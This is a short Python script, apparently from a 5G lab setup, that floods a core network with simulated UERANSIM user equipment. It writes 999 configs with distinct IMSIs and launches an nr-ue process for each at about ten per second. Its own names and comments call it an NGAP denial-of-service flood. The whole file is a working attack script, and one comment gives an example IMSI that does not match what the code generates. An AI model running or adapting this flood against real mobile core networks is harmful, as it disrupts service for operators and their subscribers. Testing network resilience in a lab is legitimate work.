#!/usr/bin/env python3
# ngap_dos.py — VM2
#!/usr/bin/env python3
# dos_ngap_unique_imsi.py — Version avec IMSI uniques
import subprocess, time

NR_UE = "/home/nana2/UERANSIM/build/nr-ue"
BASE_CONFIG = "/home/nana2/UERANSIM/config/my-ue.yaml"

for i in range(1, 1000):  # 1000 IMSI uniques
    # Génère un config temporaire avec IMSI unique
    imsi = f"001010000000{str(i).zfill(3)}"  # 001010000000001 → 00101000000001000
    config_file = f"/tmp/ue_{i}.yaml"
    
    with open(BASE_CONFIG, 'r') as f:
        content = f.read().replace("001010000000001", imsi)
    with open(config_file, 'w') as f:
        f.write(content)
    
    # Lance le UE en arrière-plan
    subprocess.Popen([NR_UE, "-c", config_file],
                     stdout=subprocess.DEVNULL,
                     stderr=subprocess.STDOUT)
    time.sleep(0.1)  # 10 UE/sec
    print(f"[*] Flood UE #{i}/1000 (IMSI: {imsi})")
